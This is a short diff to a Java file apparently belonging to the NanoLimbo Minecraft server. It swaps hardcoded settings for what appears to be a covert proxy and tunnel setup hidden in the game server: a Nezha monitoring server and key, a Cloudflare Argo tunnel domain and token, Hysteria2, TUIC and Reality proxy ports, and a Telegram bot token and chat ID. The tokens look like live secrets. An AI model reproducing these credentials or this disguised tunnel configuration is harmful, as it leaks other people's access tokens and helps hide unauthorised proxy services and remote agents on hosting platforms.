@@ -123,26 +123,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "e76438a8-01d6-4646-a813-f31c5ec6eefc");
+        envVars.put("UUID", "680c9f26-309d-478a-b788-687e195a02ab");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.ceee.nyc.mn:8008");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "Za1je4IYtj60P42uQRYXgRNR07juLu02");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "apex.888169.xyz");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNTgxMzZiNmVmNTNjNDAzOTYyMjc3YmUyNzM4ZDc5ZGUiLCJ0IjoiZjdmMTMwZjgtMGZjYi00MTA5LWEwMjctNzllNTJmNGI4YTZhIiwicyI6Ik0yRmlOell4TVRJdE5EUTFaQzAwTUdSaExXSTFOelF0T1RNeFl6VmpNalptT0RsayJ9");
+        envVars.put("ARGO_DOMAIN", "freeze2.888169.xyz");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNTgxMzZiNmVmNTNjNDAzOTYyMjc3YmUyNzM4ZDc5ZGUiLCJ0IjoiOWNmMjYzODEtMzE1Mi00NDZmLWE1YmQtZGIyODBlNzZmNzQ2IiwicyI6Ik4yWmlNakZtWkRBdFpEZGlPQzAwTjJJM0xUazRObU10WVRkbE1HVTFNV1pqTURVNSJ9");
         envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "22758");
-        envVars.put("TUIC_PORT", "30609");
-        envVars.put("ANYTLS_PORT", "30609");
-        envVars.put("REALITY_PORT", "22758");
-        envVars.put("ANYREALITY_PORT", "54990");
+        envVars.put("HY2_PORT", "10197");
+        envVars.put("TUIC_PORT", "11124");
+        envVars.put("ANYTLS_PORT", "11124");
+        envVars.put("REALITY_PORT", "10197");
+        envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "8151077286");
         envVars.put("BOT_TOKEN", "8135587157:AAHVYlHUufdme4BzrdA7cx8BSAFFufgC2xs");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "ApexNodes🚀PL");
+        envVars.put("NAME", "FreezeHost🚀Chrome");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
